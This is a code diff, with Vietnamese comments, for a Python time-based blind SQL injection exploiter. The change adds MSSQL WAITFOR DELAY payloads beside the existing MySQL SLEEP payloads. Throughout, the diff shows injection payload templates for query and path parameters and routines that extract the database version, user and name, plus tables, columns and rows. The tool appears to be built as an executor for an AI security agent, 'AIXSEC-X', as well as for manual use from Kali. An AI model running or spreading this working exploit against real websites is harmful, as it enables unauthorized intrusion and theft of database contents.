@@ -7,6 +7,13 @@ Hỗ trợ 2 kiểu vị trí inject:
   - query:  /product.php?id=123          →  ?id=123' AND (cond) AND SLEEP(3)-- -
   - path:   /search/123.html             →  /search/123%27%20AND%20(cond)%20AND%20SLEEP(3)--%20-.html
 
+Engine:
+  - mysql (mặc định): SLEEP(n) cho time-based, VERSION()/DATABASE()/USER(),
+    tables/columns/dump đầy đủ (GROUP_CONCAT + LIMIT).
+  - mssql: WAITFOR DELAY '0:0:n' cho time-based (IF (cond) WAITFOR DELAY ...),
+    @@VERSION/DB_NAME()/SUSER_SNAME(). tables/columns/dump CHƯA hỗ trợ mssql
+    (báo lỗi trung thực → dùng sqlmap --dbms=mssql).
+
 Dùng làm:
   1) CLI độc lập (chạy tay trên máy Kali)
   2) Executor cho ToolSpec `sqli_blind_extract` của AIXSEC-X
@@ -37,7 +44,11 @@ class TimeBlindExploiter:
     """Detect + extract dữ liệu bằng time-based blind SQLi (binary search)."""
 
     def __init__(self, url: str, delay: float = 3.0, threshold: float = 2.5,
-                 timeout: int = 15, headers: dict | None = None):
+                 timeout: int = 15, headers: dict | None = None,
+                 engine: str = "mysql"):
+        if engine not in ("mysql", "mssql"):
+            raise ValueError(f"engine phải là mysql hoặc mssql (nhận {engine!r})")
+        self.engine = engine
         self.url = url
         self.delay = max(0.5, float(delay))
         self.threshold = max(0.7, float(threshold))
@@ -103,7 +114,16 @@ class TimeBlindExploiter:
                            self.query, self.fragment))
 
     def _payload(self, expr: str) -> str:
-        """'AND (expr) AND SLEEP(delay) -- -' gắn sau orig_value + quote."""
+        """Payload sau orig_value + quote.
+
+        mysql: 'AND (expr) AND SLEEP(delay) -- -'
+        mssql: '; IF (expr) WAITFOR DELAY '0:0:n' -- -'  (IF là statement → cần ;
+               đóng câu SELECT trước; literal '0:0:n' tự cân bằng quote, phần thừa
+               bị comment -- - chặn).
+        """
+        if self.engine == "mssql":
+            return (f"{self.orig_value}{self.quote}; IF ({expr}) "
+                    f"WAITFOR DELAY '0:0:{int(self.delay)}'{self.comment}")
         return (f"{self.orig_value}{self.quote} AND ({expr}) AND SLEEP({self.delay})"
                 f"{self.comment}")
 
@@ -133,7 +153,8 @@ class TimeBlindExploiter:
                 trials.append((q, c))
         for q, c in trials:
             self.quote, self.comment = q, c
-            expr = "SLEEP(%d)" % self.delay
+            # mssql: probe vô điều kiện IF (1=1) WAITFOR DELAY.
+            expr = "1=1" if self.engine == "mssql" else "SLEEP(%d)" % self.delay
             t, status, _ = self._request(self._payload(expr))
             delta = t - self.baseline
             print(f"    quote={q or 'none':<5} comment={c or 'none':<5} "
@@ -183,20 +204,28 @@ class TimeBlindExploiter:
 
     # ────────────── extraction convenience ──────────────
     def version(self) -> str:
+        if self.engine == "mssql":
+            # @@VERSION là chuỗi dài kiểu "Microsoft SQL Server 2019 ..."
+            return self.extract_string("@@VERSION", 60)
         return self.extract_string("VERSION()", 40, "0123456789.-")
 
     def database(self) -> str:
-        return self.extract_string("DATABASE()", 50)
+        return self.extract_string("DB_NAME()" if self.engine == "mssql" else "DATABASE()", 50)
 
     def user(self) -> str:
-        return self.extract_string("USER()", 60)
+        # SUSER_SNAME() không đối số = login hiện tại (MSSQL 2005+).
+        return self.extract_string("SUSER_SNAME()" if self.engine == "mssql" else "USER()", 60)
 
     def tables(self, db: str = "", max_items: int = 30, max_len: int = 40) -> list[str]:
+        if self.engine == "mssql":
+            raise NotImplementedError("tables chưa hỗ trợ mssql — dùng sqlmap --dbms=mssql")
         q = ("SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES "
              + (f"WHERE TABLE_SCHEMA='{db}'" if db else ""))
         return [t for t in self.extract_string(q, 200).split(",") if t][:max_items]
 
     def columns(self, table: str, db: str = "", max_len: int = 200) -> list[str]:
+        if self.engine == "mssql":
+            raise NotImplementedError("columns chưa hỗ trợ mssql — dùng sqlmap --dbms=mssql")
         q = ("SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS "
              f"WHERE TABLE_NAME='{table}'"
              + (f" AND TABLE_SCHEMA='{db}'" if db else ""))
@@ -204,6 +233,10 @@ class TimeBlindExploiter:
 
     def dump(self, table: str, columns: list[str], limit: int = 10,
              max_len: int = 60) -> list[dict]:
+        if self.engine == "mssql":
+            raise NotImplementedError(
+                "dump chưa hỗ trợ mssql (LIMIT/OFFSET + scalar subquery là MySQL) "
+                "— dùng sqlmap --dbms=mssql")
         rows = []
         for i in range(1, limit + 1):
             row = {}
@@ -232,6 +265,9 @@ class TimeBlindExploiter:
         elif action == "user":
             out["data"]["user"] = self.user()
         elif action == "tables":
+            if self.engine == "mssql":
+                out["error"] = "tables chưa hỗ trợ mssql — dùng sqlmap --dbms=mssql"
+                return out
             out["data"]["tables"] = self.tables(kw.get("db_name", ""))
         elif action == "dump":
             cols = kw.get("columns", [])
@@ -264,11 +300,13 @@ def cli() -> int:
     ap.add_argument("--db-name", default="")
     ap.add_argument("--limit", type=int, default=10)
     ap.add_argument("--max-len", type=int, default=60)
+    ap.add_argument("--engine", choices=["mysql", "mssql"], default="mysql",
+                    help="DB engine: mysql (SLEEP, mặc định) | mssql (WAITFOR DELAY)")
     ap.add_argument("--json", action="store_true", help="Xuất kết quả JSON")
     args = ap.parse_args()
 
     ex = TimeBlindExploiter(args.url, delay=args.delay, threshold=args.threshold,
-                            timeout=args.timeout)
+                            timeout=args.timeout, engine=args.engine)
     print(f"===== SQLi blind exploiter =====")
     print(f"Target: {args.url}\n")
 
